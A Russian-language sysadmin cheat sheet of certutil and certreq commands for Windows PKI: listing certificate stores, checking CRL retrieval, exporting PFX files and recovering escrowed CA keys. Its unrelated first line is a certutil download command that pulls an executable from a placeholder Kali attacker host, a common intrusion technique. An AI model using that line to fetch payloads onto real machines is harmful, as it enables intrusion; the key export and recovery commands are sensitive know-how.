certutil.exe -urlcache -split -f http://KALI.MACHINE/FILE/TO/UPLOAD.exe  
  
certutil - отличный инструмент, но с одной проблемой - у него как и у openssl куча параметров, которые знать/помнить невозможно, особенно в условиях, когда этим пользоваться часто нет необходимости, поэтому привожу наиболее часто используемые из собственной практики.  
  
1. Посмотреть сертификаты в хранилище сервера. Это то же самое что видно в ветке peronal оснастки Certificates/Local Computer.  
Certutil –store My  
Любопытно, что там есть сертификаты у DC, которые аутентифицируют клиентов по токену (нужен для возможности подключения к CA для аутентификации), но там нет сертификатов у прочих серверов, которые также могут аутентифицировать клиентов по сертификату.   
  
2. Посмотреть сертификаты, хранимые в AD. Там хранятся сертификаты самих удостоверяющих центров.  
Certutil -store -enterprise NTAuth  
Для логона по смарткартам в этом сторе должны лежать сертификаты УЦ, выдающих сертификаты на смарткарты. NTAuth живет в AD, и на каомпьютеры домена распространяется групповой политикой. Если на компьютере не будет корректной копии NTAuth, вход по смарткарте на него будет невозможен.  
  
3. Проверить, что сертификат проверяем по CRL (Certificate Revocation List) по CDP (CRL distribution point) указанным в сертификате.  
Certutil –verify -urlfetch –v certificate.cer, где certificate.cer - имя файла, куда экспортирован сертификат.  
Команда может использоваться как для проверки сертификатов пользователей, так и для проверки сертификатов компьютеров).  
  
4. То же самое, что и п.1, но графическая:  
Certutil –viewstore My  
  
5. Запрос можно сгенерить вручную, вручную отнести на CA и получить на него сертификат. Команды приводить не буду (так как ни разу пока не делал, но приведу, где почитать, ибо был в двух шагах от этой необходимости, материал может пригодиться)  
 - Ответ товарища Valergo на форуме: http://social.technet.microsoft.com/Forums/ru-RU/windowsserverru/thread/69a887f0-8719-4a22-bde8-728d2d38d117/#a4f1dc1c-4f54-43d5-aed6-265b315e2e36  
 - Статья в TechNet: http://technet.microsoft.com/ru-ru/library/cc783835%28WS.10%29.aspx  
  
6. Проверить, что по URL в CDP можно вытащить CRL.  
Графически: Certutil –url certname.cerи нажать кнопку Retrieve.  
Текстово, вывод лучше отправить в файл: Certutil –v –verify –urlfetch certname.cer >c:certcheck.txt  
  
7. Работа с криптопровайдером (CSP - Crypto service provider):  
Certutil /scinfo   - информация о текущем.  
Certutil -csplist  - список всех.  
Certutil -csptest "cspname" (например: Certutil -csptest "Microsoft Strong Cryptographic Provider") - информация конкретном CSP.  
  
8. Посмотреть мои сертификаты:  
certutil -store -user my > my.txt  
Экспорт в PFX (PKCS#12):  
certutil -p test -user -exportPFX 0123456788e8cb1a18e cert.pfxВ качестве параметров указывается серийник и пароль (через -p)  
Импорт:  
certutil -p test -user -importpfx cert.pfx  
  
9. Хорошая помщь по certreq: http://support.microsoft.com/kb/931351  
(см. раздел "How to use the Certreq.exe utility to create and submit a certificate request that includes a SAN" в конце статьи).  
Официальная помощь: http://technet.microsoft.com/en-us/library/cc736326%28WS.10%29.aspx  
certreq -new hrctforms.inf hrctforms.reqcertreq -submit -config "SERVER_NAMECA NAME" hrctforms.req hrctforms.cer,  
где "SERVER_NAMECA NAME" - название УЦ с именем сервера.  
  
Простейший варинт файла .inf:  
[Version]  
  
Signature="$Windows NT$  
  
[NewRequest]  
Subject = "E=hrctforms@tnk-bp.com,CN=hrctforms,OU=TBInform,O=TNK-BP,L=Moscow,S=Moscow,C=RU"  
Exportable = TRUE  
KeyLength = 1024  
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"  
     
[RequestAttributes]  
CertificateTemplate = SMIMEforServices  
  
10. Резервное копирование ключей УЦ:  
certutil –backupKey  
11.certutil -pulseЗапустить autoenrollment.  
  
12.certutil -getkey - извлекает из УЦ зашифрованный ключом Агента восстановления (KRA - Key recovery agent) BLOB депонированного ключа. Команду следует запускать от пользователя с правами администратора на УЦ. определяет какие ключи доставать. Это может быть имя пользователя или серийный номер сертификата. определяет имя выходного файла. Пример:  
certutil -getkey 40a2c77f0001000000fc data.blb, где  
40a2c77f0001000000fc - серийный номер сертификата, ключ которого надо восстановить.  
  
13. certutil -recoverkey  - расшифровывает BLOB и восстанавливает депонированный ключ в PKCS#12 (файл с расширением .pfx). Команда должна выполняться от пользователя в профиле которого есть сертификат Агента восстановления с секретным ключом.  Если ошибок не было, то команда спросит пароль для шифрования PFX-файла, который будет записан в . Продолжим пример п.12:  
certutil -recoverkey data.blb username.pfx  
Подробнее: https://www.securitylab.ru/blog/personal/reply-to-all/155909.php